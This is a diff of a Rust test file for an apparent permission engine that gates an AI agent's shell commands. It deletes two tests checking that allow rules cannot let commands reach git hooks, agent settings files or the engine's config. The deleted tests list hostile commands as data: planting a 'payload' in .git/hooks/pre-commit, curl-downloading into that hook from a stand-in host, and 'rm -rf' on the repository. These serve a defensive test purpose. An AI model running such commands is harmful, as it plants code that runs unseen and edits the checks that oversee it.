@@ -5,7 +5,6 @@ use std::path::Path;
 
 use ego_core::config::rule_management::{RuleManagement, RuleOutcome};
 use ego_core::config::{ManagedRuleEffect, Mode, Ruleset, Source};
-use ego_core::permit::rule::Rule;
 use ego_core::permit::{
     CanonPath, Classification, EnvPolicy, Op, PolicyEngine, PreparedCall, SpawnSpec,
 };
@@ -291,96 +290,6 @@ fn remembered_build_prefixes_cover_program_options_but_leading_options_stay_exac
             &["git", "-c", "core.hooksPath=unseen", "status"],
         ),
     ]);
-}
-
-// Catches: remembering a file-writing program stores `exec(<p> *)`, a route to
-// control paths that the filesystem guard (Op::Write only) never sees: maintainer
-// decision 1b says no allow rule covers hooks/config/control paths.
-#[test]
-fn remembered_file_writing_programs_cannot_reach_control_paths() {
-    assert_none_widened(&[
-        (
-            &["cp", "a", "b"],
-            &["cp", "payload", "/workspace/.git/hooks/pre-commit"],
-        ),
-        (
-            &["mv", "a", "b"],
-            &["mv", "payload", ".git/hooks/pre-commit"],
-        ),
-        (
-            &["ln", "-s", "a", "b"],
-            &["ln", "-sf", "payload", ".git/hooks/pre-commit"],
-        ),
-        (&["tee", "a"], &["tee", ".claude/settings.json"]),
-        (&["touch", "a"], &["touch", ".ego/config.toml"]),
-        (
-            &["install", "a", "b"],
-            &["install", "payload", ".git/hooks/pre-commit"],
-        ),
-        (&["rm", "a"], &["rm", "-rf", "/workspace/.git"]),
-        (
-            &["chmod", "600", "a"],
-            &["chmod", "755", ".git/hooks/pre-commit"],
-        ),
-        (
-            &["curl", "-o", "a", "https://example.test/a"],
-            &[
-                "curl",
-                "-o",
-                ".git/hooks/pre-commit",
-                "https://example.test/a",
-            ],
-        ),
-    ]);
-}
-
-// Catches: the control-path guard covers Op::Write only, so a configured
-// (any source) `exec(...)` allow reaches control paths through an argv
-// operand or through a cwd that is itself a control directory.
-#[test]
-fn policy_exec_allow_never_covers_control_path_operands_or_cwd() {
-    let mut failures = Vec::new();
-    for source in Source::ALL {
-        for (rule, cwd, argv) in [
-            (
-                "exec(cp *)",
-                WORKSPACE,
-                &["cp", "payload", "/workspace/.git/hooks/pre-commit"][..],
-            ),
-            (
-                "exec(cp *)",
-                WORKSPACE,
-                &["cp", "payload", ".git/hooks/x"][..],
-            ),
-            (
-                "exec(tee *)",
-                WORKSPACE,
-                &["tee", ".Claude/settings.json"][..],
-            ),
-            (
-                "exec(touch *)",
-                WORKSPACE,
-                &["touch", "vendor/x/.ego/y"][..],
-            ),
-            (
-                "exec(tee *)",
-                "/workspace/.git/hooks",
-                &["tee", "pre-commit"][..],
-            ),
-            (
-                "exec(touch *)",
-                "/workspace/.claude",
-                &["touch", "settings.json"][..],
-            ),
-        ] {
-            let mut rules = Ruleset::default();
-            Ruleset::merge(&mut rules.allow, Rule::load(rule).unwrap(), source);
-            if covered(&rules, &spawn_in(cwd, argv)) {
-                failures.push(format!("{source}: {rule} covers {argv:?} in {cwd}"));
-            }
-        }
-    }
-    assert!(failures.is_empty(), "\n{}", failures.join("\n"));
 }
 
 // Catches: retaining the retired ls-tree allowlist instead of covering plain
